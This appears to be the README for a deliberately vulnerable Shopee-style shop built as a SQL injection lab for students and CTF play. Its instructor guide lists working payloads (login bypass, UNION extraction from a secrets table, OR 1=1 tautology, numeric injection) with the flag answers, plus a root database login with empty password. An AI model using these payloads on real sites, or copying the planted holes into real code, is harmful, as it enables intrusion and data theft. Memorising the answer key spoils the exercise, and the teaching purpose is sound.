# 🛍️ ShopNova - Shopee-Style E-Commerce SQLi Lab

A realistic, Shopee-inspired consumer e-commerce store with a clean **White Theme** built with **SQL Injection (SQLi)** vulnerabilities for cybersecurity education, student assessments, and CTF challenges.

---

## 🌟 Key Updates & Features

1. **Clean White Theme & Shopee Aesthetic**:
   - Signature vibrant orange accents (`#ee4d2d`), white cards, and clean typography.
   - Looks like a genuine e-commerce platform (**ShopNova Mall**) with flash sales, discount tags (`-25% OFF`), star ratings, sales volume (`2.4k sold`), and real consumer products (Sony Headphones, Mechanical Keyboards, Air Fryers, Sneakers, etc.).
   - No overt "cyber/military" jargon in the customer-facing interface.

2. **Simplified Name-Only Check-In Gate**:
   - Before browsing, users are welcomed at the **Customer Check-In Gate** (`/gate`).
   - Only asks for their **Full Name** (no ID number).
   - Once submitted, their name is permanently rendered in:
     - **Top Orange Header Ribbon**: Displays `👤 Shopper: [Student Name]` across all pages.
     - **Live Timestamp Watermark**: Stamped in the bottom corner (`[Student Name] | HH:MM:SS`) to guarantee screenshots can't be cropped or shared.

3. **MySQL Database with Automated Seeding (`npm run migrate`)**:
   - Seeds consumer products with high-resolution photos, realistic parcel tracking orders, seller accounts, and hidden CTF flags.

4. **Realistic SQL Injection Vectors**:
   - **Product Search (`/catalog?search=...`)**: UNION-based SQLi & Error-based SQLi.
   - **Seller Login (`/login`)**: Authentication Bypass SQLi (`admin' -- `).
   - **Parcel Tracker (`/orders/track?code=...`)**: Tautology / Boolean SQLi (`' OR 1=1 -- `).
   - **Product Details (`/product/:id`)**: Unquoted Numeric SQLi.

---

## 🚀 Quick Setup & Usage

### 1. Database Configuration (`.env`)
Pre-configured for local MySQL (e.g. XAMPP, WAMP, or MySQL service on port `3306` with user `root`):
```env
PORT=3000
DB_HOST=127.0.0.1
DB_PORT=3306
DB_USER=root
DB_PASSWORD=
DB_NAME=aegis_tech_lab
SESSION_SECRET=aegis-cyber-lab-secret-2024
```

### 2. Run Database Migration & Seeding
```bash
npm run migrate
```

### 3. Start Server
```bash
npm start
```
*(If you are running nodemon or dev mode: `npm run dev`)*

Open browser: **`http://localhost:3000`**

---

## 🎯 Lab Tasks & Solutions (Instructor Grading Guide)

Available in-app at **`http://localhost:3000/lab-guide`**.

| Challenge | Target URL | Vulnerability Type | Example Payload | Captured Deliverable / Flag |
| :--- | :--- | :--- | :--- | :--- |
| **1. Seller Login Bypass** | `/login` | Authentication Bypass | Username: `admin' -- `<br>Password: *(any)* | Unlocks Seller Centre (`/admin`) & `FLAG{sh0p_4dm1n_byp4ss_2026}` |
| **2. Catalog UNION Injection** | `/catalog?search=` | UNION Data Extraction | `' UNION SELECT 1, secret_name, category, flag, 999, 1, 5, 'https://images.unsplash.com/photo-1505740420928-5e560c06d30e', secret_value FROM lab_secrets -- ` | Extracts secret flag `FLAG{un10n_pr0duct_s34rch_fl4g}` or user passwords in catalog |
| **3. Parcel Tracking Leak** | `/orders/track?code=` | Boolean / Tautology | `SN' OR 1=1 -- ` | Dumps all customer delivery addresses and voucher notes (`FLAG{sql1_ord3r_l34k_succ3ss}`) |
| **4. Product Numeric SQLi** | `/product/:id` | Unquoted Numeric ID | `/product/1 OR 1=1` | Bypasses item filter |

---

## 🧪 Verification Test
Run anytime to verify all SQLi endpoints and student watermarks:
```bash
npm test
```
